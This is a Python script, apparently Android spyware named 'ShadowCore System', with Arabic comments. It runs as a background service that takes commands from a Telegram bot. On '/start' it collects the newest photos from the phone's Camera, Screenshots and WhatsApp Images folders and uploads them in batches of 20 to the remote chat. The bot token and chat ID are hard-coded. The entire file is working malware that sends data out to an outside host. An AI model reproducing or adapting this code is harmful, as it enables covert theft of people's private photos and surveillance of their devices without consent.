# ShadowCore System - Background Service (Updated with User Credentials)
import os
import time
import sys
import logging
import requests

# بياناتك الخاصة
TELEGRAM_BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
DEFAULT_CHAT_ID = "6110903337"

# إعدادات الخدمة
POLL_INTERVAL = 10  # فحص كل 10 ثواني
BATCH_SIZE = 20     # إرسال 20 صورة
sent_files = set()
last_update_id = 0

def telegram_send(method, data, files=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}"
    try:
        r = requests.post(url, data=data, files=files, timeout=30)
        return r.json()
    except: return None

def get_latest_images():
    # سيقوم بالبحث في المسارات الشائعة
    paths = [
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Pictures/Screenshots",
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Images"
    ]
    found = []
    for p in paths:
        if os.path.exists(p):
            imgs = [os.path.join(p, f) for f in os.listdir(p) if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
            found.extend(imgs)
    found.sort(key=os.path.getmtime, reverse=True)
    return found

def main_loop():
    global last_update_id
    while True:
        try:
            # فحص الأوامر من البوت
            updates_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={last_update_id + 1}"
            res = requests.get(updates_url, timeout=10).json()
            
            if res.get("result"):
                for update in res["result"]:
                    last_update_id = update["update_id"]
                    msg_text = update.get("message", {}).get("text", "")
                    chat_id = update.get("message", {}).get("chat", {}).get("id")

                    if msg_text == "/start":
                        telegram_send("sendMessage", {"chat_id": chat_id, "text": "🔄 جاري تحضير الأرشيف (20 صورة)..."})
                        
                        images = get_latest_images()
                        count = 0
                        for img_path in images:
                            if count >= BATCH_SIZE: break
                            if img_path not in sent_files:
                                with open(img_path, 'rb') as f:
                                    if telegram_send("sendDocument", {"chat_id": chat_id}, {"document": f}):
                                        sent_files.add(img_path)
                                        count += 1
                                        time.sleep(2)
                        
                        telegram_send("sendMessage", {"chat_id": chat_id, "text": "✅ اكتملت الدفعة الحالية."})

        except Exception as e:
            time.sleep(POLL_INTERVAL)
        time.sleep(POLL_INTERVAL)

if __name__ == '__main__':
    main_loop()
